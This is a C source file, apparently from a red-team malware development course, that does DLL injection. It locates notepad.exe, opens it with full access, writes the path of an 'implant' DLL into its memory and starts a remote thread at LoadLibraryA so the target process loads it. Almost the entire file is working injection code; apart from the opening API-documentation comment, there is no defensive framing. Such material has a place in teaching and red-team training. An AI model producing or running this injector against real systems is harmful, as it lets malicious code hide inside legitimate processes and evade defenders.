/*

Based on RTO Course from Sektor 7 Institute. 

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32
        The size of the structure, in bytes. Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize, Process32First fails.
https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next

https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcmpia

https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread




1) Find target process on localhost
        CreateToolhelp32Snapshot
2) open the target process
        OpenProcess



*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int findTarget(char * suppliedProcName) {

        PROCESSENTRY32 processEntryStruct;
        DWORD pid;

        HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hsnapshot == INVALID_HANDLE_VALUE){
                return 0;
        }
        processEntryStruct.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hsnapshot, &processEntryStruct)){
                return 0;
        }
        while (Process32Next(hsnapshot, &processEntryStruct)){
                if (lstrcmpiA(suppliedProcName, processEntryStruct.szExeFile) == 0){
                        pid = processEntryStruct.th32ProcessID;
                        break;
                }
        }
        CloseHandle(hsnapshot);

        return pid;

}

int wmain(void){

	DWORD pid;
	char target[] = "notepad.exe";
	char dll[] = "C:\\Users\\Administrator\\Desktop\\RTO-maldev\\RTO\\07.Code_Injection\\02.DLL\\newimplantDLL.dll";

	pid = findTarget(target);
	if ( pid == 0) {
		printf("Target NOT FOUND! Exiting.\n");
		return -1;
	}

	printf("Target PID: [ %d ]\nInjecting...", pid);

    
	FARPROC pLoadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (pLoadLibrary != NULL){
		printf("\nlibrary loaded\n");
	}

	HANDLE hOpenProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD) pid);
	if (hOpenProcess != NULL){
		printf("\nprocess opened\n");
		
		LPVOID remoteBuffer = VirtualAllocEx(hOpenProcess, NULL, sizeof(dll), MEM_COMMIT, PAGE_READWRITE);
		if (remoteBuffer == NULL){
			printf("\nvirtual alloc failed\n");
		}

		BOOL wpm = WriteProcessMemory(hOpenProcess, remoteBuffer, (LPCVOID) dll, (SIZE_T) sizeof(dll), NULL);
		if (wpm == NULL){
			printf("\nwrite process memory failed\n");
		}

		CreateRemoteThread(hOpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pLoadLibrary, remoteBuffer, 0, NULL);
		
		printf("done!\nremBuf addr = %p\n", remoteBuffer);

	CloseHandle(hOpenProcess); 
	}
	else {
		printf("\nOpenProcess failed! Exiting.\n");
		return -2;
	}
}
